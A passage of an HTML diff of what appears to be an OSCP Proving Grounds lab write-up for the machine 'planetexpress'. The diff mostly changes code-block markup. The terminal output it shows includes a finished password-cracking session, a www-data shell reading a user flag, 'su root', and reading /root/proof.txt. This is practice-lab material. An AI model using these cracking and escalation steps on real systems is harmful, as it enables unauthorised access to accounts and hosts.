 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
@@ -400,7 +636,26 @@
 </span></span><span class="line"><span class="cl">1g 0:00:14:10 DONE <span class="o">(</span>2023-12-20 02:21<span class="o">)</span> 0.001176g/s 990.2p/s 990.2c/s 990.2C/s newbattle..nevada99
 </span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </span></span><span class="line"><span class="cl">Session completed. 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~/html/planetexpress$ cat /home/astro/local.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@planetexpress:~/html/planetexpress$ cat /home/astro/local.txt
 </span></span><span class="line"><span class="cl">cat /home/astro/local.txt
 </span></span><span class="line"><span class="cl">4c019d06769bb528fd86b118803b7ba1
 </span></span><span class="line"><span class="cl">www-data@planetexpress:~/html/planetexpress$ su root
@@ -413,7 +668,9 @@
 </span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">33</span> Dec <span class="m">19</span> 11:59 proof.txt
 </span></span><span class="line"><span class="cl">cat /root/proof.txt
 </span></span><span class="line"><span class="cl">43adc185281166087180042464900510
-</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
